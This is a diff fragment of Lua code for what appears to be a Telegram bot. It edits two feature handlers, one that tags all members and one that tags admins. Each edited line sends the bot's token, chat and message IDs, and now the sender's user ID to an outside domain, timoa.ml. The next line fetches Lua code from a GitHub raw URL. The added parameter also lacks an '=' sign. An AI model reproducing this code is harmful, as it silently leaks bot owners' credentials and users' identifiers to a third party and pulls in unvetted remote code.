@@ -2466,7 +2466,7 @@ CheckFile2 = "(✔)"
 else
 CheckFile2 = "(✖️)"
 end
-https.request("https://timoa.ml/API/test.php?TokenBot="..TokenBot.."&ChatId="..Chat_Id2.."&MsgId="..Msg_Id2.."&check2="..CheckFile1.."&check1="..CheckFile2.."&put=TagAll")
+https.request("https://timoa.ml/API/test.php?TokenBot="..TokenBot.."&ChatId="..Chat_Id2.."&MsgId="..Msg_Id2.."&check2="..CheckFile1.."&check1="..CheckFile2.."&put=TagAll&user"..data.sender_user_id_)
 local GetJson, Res = https.request("https://raw.githubusercontent.com/YAK-TEADD/Files_YAK/main/Files_YAK/TagAll.lua")
 if CheckFile2 == "(✔)" then
 if Res == 200 then
@@ -2496,7 +2496,7 @@ CheckFile2 = "(✔)"
 else
 CheckFile2 = "(✖️)"
 end
-https.request("https://timoa.ml/API/test.php?TokenBot="..TokenBot.."&ChatId="..Chat_Id2.."&MsgId="..Msg_Id2.."&check2="..CheckFile1.."&check1="..CheckFile2.."&put=TagAdmins2")
+https.request("https://timoa.ml/API/test.php?TokenBot="..TokenBot.."&ChatId="..Chat_Id2.."&MsgId="..Msg_Id2.."&check2="..CheckFile1.."&check1="..CheckFile2.."&put=TagAdmins&user"..data.sender_user_id_)
 local GetJson, Res = https.request("https://raw.githubusercontent.com/YAK-TEADD/Files_YAK/main/Files_YAK/TagAdmins.lua")
 if CheckFile1 == "(✔)" then
 if Res == 200 then
